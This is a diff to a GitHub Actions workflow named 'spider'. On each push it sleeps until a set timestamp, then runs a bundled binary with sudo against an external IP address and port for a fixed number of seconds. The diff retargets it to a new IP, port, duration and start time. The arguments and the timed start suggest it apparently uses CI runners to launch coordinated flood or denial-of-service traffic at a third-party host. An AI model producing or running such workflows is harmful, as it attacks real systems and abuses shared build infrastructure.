@@ -1,4 +1,4 @@
-# run ef58cbfab2574ac5ae53a614ca47647a
+# run 439860e4460c42deb6c3f3ec6559198a
 name: spider
 on:
   push:
@@ -18,11 +18,11 @@ jobs:
     - uses: actions/checkout@v4
     - name: sync
       run: |
-        target=1794258833
+        target=1794259229
         now=$(date +%s)
         wait=$((target-now))
         if [ "$wait" -gt 0 ]; then sleep "$wait"; fi
     - name: run
       run: |
         chmod +x ./spider
-        sudo ./spider 91.108.17.33 32003 30 1024 vc
+        sudo ./spider 151.242.187.53 9997 15 1024 vc
